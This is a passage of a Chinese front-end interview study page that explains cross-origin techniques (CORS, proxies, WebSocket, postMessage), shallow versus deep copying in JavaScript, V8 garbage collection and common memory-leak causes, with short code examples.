<ul><li>浏览器发送 OPTIONS 预检请求</li> <li>服务器响应预检请求，包含允许的 CORS 头</li> <li>浏览器确认后发送实际请求</li> <li>服务器响应实际请求</li></ul></li></ul> <h4 id="简单请求"><a href="#简单请求" class="header-anchor">#</a> 简单请求：</h4> <p>某些请求不会触发 CORS 预检请求。本文称这样的请求为“简单请求”</p> <ul><li>满足简单请求的条件：
<ul><li>请求为 GET、HEAD、POST 其一</li></ul> <ul><li>仅包含以下头：
<ul><li><code>Accept</code></li> <li><code>Accept-Language</code></li> <li><code>Content-Language</code></li> <li><code>Content-Type</code> (仅限于 <code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code>)</li></ul></li></ul></li></ul> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">// 允许访问源</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Access-Control-Allow-Origin:\*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 允许访问的有效期</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Access-Control-Max-Age:86400'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 允许访问的方法</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Access-Control-Allow-Methods:OPTIONS, GET, POST, DELETE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h4 id="_3、代理服务器"><a href="#_3、代理服务器" class="header-anchor">#</a> 3、代理服务器</h4> <p>​<strong>​原理：绕过浏览器的同源限制</strong></p> <p>同源策略是浏览器实现的安全机制，Node.js 作为服务端运行时，发起 HTTP 请求<strong>不受同源策略限制</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// ​Node.js代理示例</span>
<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> createProxyMiddleware <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-proxy-middleware'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/api'</span><span class="token punctuation">,</span> <span class="token function">createProxyMiddleware</span><span class="token punctuation">(</span><span class="token punctuation">{</span> 
  <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'https://target-server.com'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token string-property property">'^/api'</span><span class="token operator">:</span> <span class="token string">''</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>Nginx配置​​：</p> <div class="language-nginx line-numbers-mode"><pre class="language-nginx"><code><span class="token directive"><span class="token keyword">location</span> /api/</span> <span class="token punctuation">{</span>
  <span class="token directive"><span class="token keyword">proxy_pass</span> https://target-server.com/</span><span class="token punctuation">;</span>
  <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$host</span></span><span class="token punctuation">;</span>
  <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h4 id="_4、websocket"><a href="#_4、websocket" class="header-anchor">#</a> 4、WebSocket</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'wss://echo.websocket.org'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

socket<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Hello Server!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

socket<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'收到消息:'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h4 id="_5、postmessage-跨文档通信"><a href="#_5、postmessage-跨文档通信" class="header-anchor">#</a> 5、postMessage (跨文档通信)</h4> <p>发送方​​：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'myIframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">,</span> <span class="token string">'https://target-origin.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>接收方​​：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token string">'https://trusted-origin.com'</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'收到消息:'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="其他"><a href="#其他" class="header-anchor">#</a> 其他</h4> <p>img 的 <code>src</code> 属性、link 的 <code>href</code> 属性、script 的 <code>src</code> 属性</p> <h2 id="_15-关于-js-的堆栈和拷贝"><a href="#_15-关于-js-的堆栈和拷贝" class="header-anchor">#</a> 15. 关于 JS 的堆栈和拷贝</h2> <h3 id="一、栈-stack-和堆-heap"><a href="#一、栈-stack-和堆-heap" class="header-anchor">#</a> 一、栈(stack)和堆(heap)</h3> <p>stack 为自动分配的内存空间，它由系统自动释放<br>
而 heap 则是动态分配的内存，大小不定也不会自动释放</p> <h3 id="二、基本类型和引用类型"><a href="#二、基本类型和引用类型" class="header-anchor">#</a> 二、基本类型和引用类型</h3> <p><strong>基本类型</strong>：存放在栈内存中的简单数据段，数据大小确定，内存空间大小可以分配<br>
5 种基本数据类型有 Undefined、Null、Boolean、Number 和 String，它们是直接按值存放的，所以可以直接访问。</p> <p><strong>引用类型</strong>：存放在堆内存中的对象，变量实际保存的是一个指针，这个指针指向另一个位置。每个空间大小不一样，要根据情况开进行特定的分配。</p> <p>当我们需要访问引用类型（如对象，数组，函数等）的值时，首先从栈中获得该对象的地址指针，然后再从堆内存中取得所需的数据</p> <h3 id="三、浅拷贝和深拷贝"><a href="#三、浅拷贝和深拷贝" class="header-anchor">#</a> 三、浅拷贝和深拷贝</h3> <h4 id="浅拷贝"><a href="#浅拷贝" class="header-anchor">#</a> 浅拷贝</h4> <p>在定义一个对象或数组时，变量存放的往往只是一个地址。当我们使用对象拷贝时，如果属性是对象或数组时，这时候我们传递的也只是一个地址  .
因此子对象在访问该属性时，会根据地址回溯到父对象指向的堆内存中，即父子对象发生了关联，两者的属性值会指向同一内存空间</p> <h4 id="深拷贝"><a href="#深拷贝" class="header-anchor">#</a> 深拷贝</h4> <p>如果希望父子对象之间产生关联，那么这时候可以用到深拷贝  .
既然属性值类型是数组和或象时只会传址，那么我们就用递归来解决这个问题，把父对象中所有属于对象的属性类型都遍历赋给子对象即可</p> <h3 id="四、实现浅拷贝"><a href="#四、实现浅拷贝" class="header-anchor">#</a> 四、实现浅拷贝</h3> <p>Object.assign(）和展开运算符(...)对于深浅拷贝的结果是一样<br>
如果拷贝的层数超过了一层的话，那么就会进行浅拷贝</p> <h4 id="_1-扩展运算符"><a href="#_1-扩展运算符" class="header-anchor">#</a> 1. 扩展运算符</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> original <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">c</span><span class="token operator">:</span> <span class="token number">2</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> shallowCopy <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">...</span>original <span class="token punctuation">}</span><span class="token punctuation">;</span>

original<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// 不影响拷贝</span>
original<span class="token punctuation">.</span>b<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token comment">// 影响拷贝</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// {&quot;a&quot;:10,&quot;b&quot;:{&quot;c&quot;:20}}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>shallowCopy<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// {&quot;a&quot;:1,&quot;b&quot;:{&quot;c&quot;:20}}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h4 id="_2-object-assign"><a href="#_2-object-assign" class="header-anchor">#</a> 2. Object.assign()</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> original <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">c</span><span class="token operator">:</span> <span class="token number">2</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> shallowCopy <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> original<span class="token punctuation">)</span><span class="token punctuation">;</span>

original<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// 不影响拷贝</span>
original<span class="token punctuation">.</span>b<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token comment">// 影响拷贝</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// {&quot;a&quot;:10,&quot;b&quot;:{&quot;c&quot;:20}}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>shallowCopy<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// {&quot;a&quot;:1,&quot;b&quot;:{&quot;c&quot;:20}}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h4 id="_3-array-prototype-slice"><a href="#_3-array-prototype-slice" class="header-anchor">#</a> 3. Array.prototype.slice()</h4> <p><code>arr.slice()</code> 方法用于创建一个数组的浅拷贝。</p> <ul><li>如果数组中的元素是基本数据类型（如数字、字符串等），那么在原数组和新数组中，这些元素是独立的，互不影响。</li> <li>如果数组中包含对象或数组，slice() 方法会复制这些对象或数组的引用到新数组中。</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> original <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">2</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> shallowCopy <span class="token operator">=</span> original<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

original<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// 不影响拷贝</span>
original<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token comment">// 影响拷贝</span>
original<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span> <span class="token comment">// 影响拷贝</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// [10,{&quot;a&quot;:20},[30]]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>shallowCopy<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// [1,{&quot;a&quot;:20},[30]]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="五、实现深拷贝"><a href="#五、实现深拷贝" class="header-anchor">#</a> 五、实现深拷贝：</h3> <h4 id="_1-json方法-最简单但有局限"><a href="#_1-json方法-最简单但有局限" class="header-anchor">#</a> 1. JSON方法（最简单但有局限）</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> original <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>
    <span class="token function-variable function">b</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">c</span><span class="token operator">:</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">&quot;sym&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">d</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token literal-property property">e</span><span class="token operator">:</span> <span class="token string">&quot;str&quot;</span><span class="token punctuation">,</span>
    <span class="token literal-property property">f</span><span class="token operator">:</span> <span class="token number">123</span><span class="token punctuation">,</span>
    <span class="token literal-property property">g</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">h</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">&quot;\\w+&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> deepCopy <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>deepCopy<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">// {&quot;d&quot;:true,&quot;e&quot;:&quot;str&quot;,&quot;f&quot;:123,&quot;g&quot;:&quot;2025-05-22T07:50:21.082Z&quot;,&quot;h&quot;:{}}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><ul><li>局限​​：
<ul><li>忽略undefined、function和Symbol</li> <li>不能处理循环引用</li> <li>会丢失Date对象（转为字符串）</li> <li>会丢失RegExp对象（转为空对象）</li> <li>不能序列化函数</li> <li>不能解决循环引用的对象 -&gt; 报错：Converting circular structure to JSON</li></ul></li></ul> <h4 id="_2-使用第三方库-lodash"><a href="#_2-使用第三方库-lodash" class="header-anchor">#</a> 2. 使用第三方库 lodash</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// lodash</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> cloneDeep <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'lodash'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> deepCopy <span class="token operator">=</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// jQuery</span>
<span class="token keyword">const</span> deepCopy <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> original<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h4 id="_3-现代浏览器原生深拷贝api-structuredclone"><a href="#_3-现代浏览器原生深拷贝api-structuredclone" class="header-anchor">#</a> 3. 现代浏览器原生深拷贝API：structuredClone</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> original <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">date</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token literal-property property">set</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> copy <span class="token operator">=</span> <span class="token function">structuredClone</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>不支持​​：
<ul><li>函数</li> <li>DOM节点</li> <li>对象原型链</li></ul></li></ul> <h2 id="_16-v8下的垃圾回收机制"><a href="#_16-v8下的垃圾回收机制" class="header-anchor">#</a> 16. V8下的垃圾回收机制</h2> <h4 id="_1-内存分代管理​​"><a href="#_1-内存分代管理​​" class="header-anchor">#</a> 1. 内存分代管理​​</h4> <p>V8 将堆内存分为两个主要区域，<strong>采用​​分代回收策略</strong>​​：</p> <table><thead><tr><th style="text-align:center;">内存区域</th> <th style="text-align:center;">存储对象类型</th> <th style="text-align:center;">回收频率</th> <th style="text-align:center;">回收算法</th></tr></thead> <tbody><tr><td style="text-align:center;">​​新生代​</td> <td style="text-align:center;">存活时间短的对象（临时变量）</td> <td style="text-align:center;">高</td> <td style="text-align:center;">Scavenge</td></tr> <tr><td style="text-align:center;">老生代​</td> <td style="text-align:center;">存活时间长的对象（全局变量）</td> <td style="text-align:center;">低</td> <td style="text-align:center;">标记-清除/标记-整理</td></tr></tbody></table> <h4 id="_2-新生代回收-scavenge-算法"><a href="#_2-新生代回收-scavenge-算法" class="header-anchor">#</a> 2. 新生代回收：Scavenge 算法</h4> <ul><li>新生代空间: 用于存活较短的对象，又分成两个空间，每份空间称为 <code>semi-space</code>: <strong>from 空间</strong> 与 <strong>to 空间</strong>，在这两个空间中，必定有一个空间是使用的，另一个空间是空闲的。</li></ul> <p>新分配的对象会被放入 From 空间中，当 From 空间被占满时，新生代 GC 就会启动了。</p> <ul><li>Scavenge GC算法: 当 from 空间被占满时，启动 GC 算法<br>
1、存活的对象从 from space 转移到 to space<br>
2、清空 from space<br>
3、from space 与 to space 互换<br>
4、完成一次新生代GC</li></ul> <img src="/Front-end-go-on/assets/img/young.c02589db.png"> <h4 id="_3-老生代回收-full-mark-compact-进行垃圾回收"><a href="#_3-老生代回收-full-mark-compact-进行垃圾回收" class="header-anchor">#</a> 3.老生代回收：Full Mark-Compact 进行垃圾回收</h4> <p>主要有三个阶段：<strong>标记-清除（Mark-Sweep）</strong> 与 <strong>标记-整理（Mark-Compact</strong></p> <ul><li>老生代空间: 用于存活时间较长的对象</li></ul> <ul><li>为什么需要老生代空间？
如果仅仅让存活对象在 <code>semi-space</code> 之间一直复制，那么新生代的内存空间很快就会被耗尽。所以当一个对象经过复制后依然存活时，它会被认为是生命周期较长的对象。这种生命周期较长的对象随后会被移动到老生代中，采用新的算法管理。对象从新生代中移动到老生代中的过程称为晋升。</li></ul> <ul><li>从 新生代空间 转移到 老生代空间 的条件，满足其一即可<br>
1、经历过一次以上 Scavenge GC 的对象<br>
2、当 to space 体积超过25%</li></ul> <img src="/Front-end-go-on/assets/img/old.e5f6e2f3.png"> <h4 id="标记-清除阶段"><a href="#标记-清除阶段" class="header-anchor">#</a> 标记-清除阶段</h4> <ul><li>标记算法：
<ul><li>增量标记: 小模块标记，将标记过程拆分为多个小步骤，穿插在 JavaScript 执行之间，会影响性能</li> <li>并发标记(最新技术): 不阻塞 js 执行</li></ul></li></ul> <ul><li>1.遍历对象图，标记所有可达对象</li> <li>2.释放未被标记的内存块</li></ul> <img src="/Front-end-go-on/assets/img/gc_clear.6110acf7.png"> <h4 id="标记-整理​阶段"><a href="#标记-整理​阶段" class="header-anchor">#</a> 标记-整理​阶段</h4> <ul><li>1.标记阶段​​：同标记-清除</li> <li>2.将内存中清除后导致的碎片化对象往内存堆的一端移动，解决内存的碎片化</li></ul> <img src="/Front-end-go-on/assets/img/gc_mark.33f8cce7.png"> <h2 id="_17-内存泄漏是什么"><a href="#_17-内存泄漏是什么" class="header-anchor">#</a> 17. 内存泄漏是什么</h2> <p>内存泄漏是指程序中已不再需要的内存没有被垃圾回收机制(GC)正确释放，导致内存占用持续增长，最终可能引发性能下降甚至程序崩溃。</p> <h3 id="_1、意外的全局变量"><a href="#_1、意外的全局变量" class="header-anchor">#</a> 1、意外的全局变量</h3> <ul><li>在一个函数你忘记用变量声明符(var 或 let)来声明的变量，一个意外的全局变量就被创建了</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  str <span class="token operator">=</span> <span class="token string">&quot;str&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>在函数中通过 this 赋予变量，在函数中，this 指向 window</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>str <span class="token operator">=</span> <span class="token string">&quot;str&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>为了阻止这种错误发生，在你的 Javascript 文件最前面添加'use strict;'
这开启了解析 JavaScript 的阻止意外全局的更严格的模式<br>
如果必须用全局变量来存储很多数据，在处理完之后，确保对其清零或重新赋值</p> <h3 id="_2、定时器-settimeout-setinterval-以及回调函数"><a href="#_2、定时器-settimeout-setinterval-以及回调函数" class="header-anchor">#</a> 2、定时器 setTimeout setInterval 以及回调函数</h3> <p>当不需要 setInterval 或者 setTimeout 时，定时器没有被 clear，定时器的回调函数以及内部依赖的变量都不能被回收，造成内存泄漏<br>
比如：vue 使用了定时器，需要在 beforeDestroy 中做对应销毁处理。js 也是一样的</p> <h3 id="_3、闭包-在全局作用域上保留着闭包局部变量的引用"><a href="#_3、闭包-在全局作用域上保留着闭包局部变量的引用" class="header-anchor">#</a> 3、闭包(在全局作用域上保留着闭包局部变量的引用)</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">createClosure</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">1e6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// data 无法被释放</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
